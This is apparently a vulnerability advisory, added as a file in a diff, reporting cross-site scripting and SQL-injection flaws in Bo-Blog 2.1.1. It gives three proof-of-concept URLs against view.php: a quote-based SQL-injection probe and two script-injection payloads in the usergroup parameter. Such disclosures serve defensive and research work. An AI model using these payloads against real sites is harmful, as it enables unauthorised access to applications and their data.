@@ -1,0 +1,13 @@
+source: http://www.securityfocus.com/bid/61880/info
+
+Bo-Blog is prone to a cross-site scripting vulnerability and an SQL-injection vulnerability because it fails to properly sanitize user-supplied input.
+
+Attackers can exploit these issues to execute arbitrary code in the context of the browser, compromise the application, access or modify data, or exploit latent vulnerabilities in the underlying database; other attacks are also possible.
+
+Bo-Blog 2.1.1 is vulnerable; other versions may also be affected. 
+
+http://www.example.com//view.php?go=userlist&ordered=1%27 [SQLi]
+
+http://www.example.com/view.php?go=userlist&ordered=1&usergroup=%22/%3E%3Cscript%3Ealert%281%29;%3C/script%3E [XSS]
+
+http://www.example.com//view.php?go=userlist&ordered=1&usergroup="/><script>alert(1);</script> [XSS] 
